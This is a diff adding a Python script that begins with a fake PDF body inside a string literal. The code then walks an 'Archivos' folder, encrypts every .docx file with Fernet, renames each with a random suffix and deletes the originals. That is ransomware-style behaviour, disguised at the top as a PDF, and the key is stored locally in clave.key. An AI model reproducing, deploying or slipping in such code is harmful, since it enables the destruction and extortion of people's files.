@@ -1,0 +1,98 @@
+"""%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 35 >>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(Este es un documento PDF!!) Tj
+ET
+endstream
+endobj
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000000110 00000 n
+0000000210 00000 n
+trailer
+<< /Size 5 /Root 1 0 R >>
+startxref
+310
+%%EOF
+"""
+#pip install cryptography
+#pip install python-docx
+
+import os
+import random
+import string
+import win32com.client as win32
+from cryptography.fernet import Fernet
+
+def generar_string_aleatorio(longitud=10):
+    caracteres = string.ascii_letters + string.digits
+    return ''.join(random.choice(caracteres) for _ in range(longitud))
+
+def guardar_clave(key, ruta="clave.key"):
+    with open(ruta, "wb") as f:
+        f.write(key)
+    print(f"Clave guardada en: {ruta}")
+
+def cargar_clave(ruta="clave.key"):
+    with open(ruta, "rb") as f:
+        return f.read()
+
+def cifrar_docx_word(archivo_entrada, archivo_salida):
+
+    cipher = Fernet(key)
+    with open(archivo_entrada, "rb") as f:
+        data = f.read()
+    encrypted_data = cipher.encrypt(data)
+    with open(archivo_salida, "wb") as f:
+        f.write(encrypted_data)
+    os.remove(archivo_entrada)
+	
+
+def descifrar_archivo(archivo_cifrado, archivo_salida, key):
+    cipher = Fernet(key)
+
+    with open(archivo_cifrado, "rb") as f:
+        encrypted_data = f.read()
+
+    decrypted_data = cipher.decrypt(encrypted_data)
+
+    with open(archivo_salida, "wb") as f:
+        f.write(decrypted_data)
+
+    print(f"Archivo descifrado: {archivo_salida}")
+        
+directorio_base = "Archivos"
+key = Fernet.generate_key()
+guardar_clave(key)
+
+for ruta_actual, subdirs, archivos in os.walk(directorio_base):
+    for archivo in archivos:
+        if archivo.lower().endswith(".docx"):
+            ruta_completa = os.path.join(ruta_actual, archivo)
+            nuevo_nombre = archivo+"."+generar_string_aleatorio()
+            nueva_ruta = os.path.join(ruta_actual, nuevo_nombre)
+
+			
+	
+            cifrar_docx_word(ruta_completa, nueva_ruta)
+
+
+            #print(f"Cambiado: {ruta_completa} -> {nueva_ruta}")
+
+print("¡Proceso completado!")
+
